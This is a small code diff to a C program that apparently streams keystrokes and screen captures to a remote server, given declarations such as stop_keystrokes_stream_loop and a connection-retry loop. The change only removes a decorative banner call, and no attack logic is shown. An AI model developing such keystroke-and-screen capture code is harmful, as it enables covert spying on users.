@@ -33,7 +33,6 @@ void stop_keystrokes_stream_loop();
 void stop_screen_stream_sig();
 
 int main(){
-	print_rocket_ship_image();
 	while (create_connection() != CONNECTION_SUCCESS){
 		printf("[\033[31;1m-\033[0m] \033[31;1mconnection failed, trying to connect again ...\033[0m\n");
 		sleep(2);
